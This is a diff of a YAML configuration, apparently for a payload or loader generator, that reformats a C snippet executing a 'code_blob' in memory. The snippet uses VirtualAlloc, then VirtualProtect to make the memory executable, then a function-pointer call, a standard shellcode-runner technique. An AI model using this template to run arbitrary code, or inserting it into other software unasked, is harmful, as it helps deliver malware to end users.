@@ -7,7 +7,25 @@ sections:
   - id: VirtualAllocExec
     display: VirtualAlloc + Function Pointer
     default: true
-    snippet: "// Execute via VirtualAlloc + function pointer\n{\n    void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n    if (execMem == NULL) return -1;\n    \n    memcpy(execMem, code_blob, code_blob_len);\n    \n    DWORD oldProtect;\n    if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {\n        VirtualFree(execMem, 0, MEM_RELEASE);\n        return -1;\n    }\n    \n    ((void(*)())execMem)();\n    \n    VirtualFree(execMem, 0, MEM_RELEASE);\n}\n"
+    snippet: |
+      // Execute via VirtualAlloc + function pointer
+      {
+          void* execMem = VirtualAlloc(NULL, code_blob_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+          if (execMem == NULL) return -1;
+          
+          memcpy(execMem, code_blob, code_blob_len);
+          
+          DWORD oldProtect;
+          if (!VirtualProtect(execMem, code_blob_len, PAGE_EXECUTE_READ, &oldProtect)) {
+              VirtualFree(execMem, 0, MEM_RELEASE);
+              return -1;
+          }
+          
+          ((void(*)())execMem)();
+          
+          VirtualFree(execMem, 0, MEM_RELEASE);
+      }
+
 
 
 
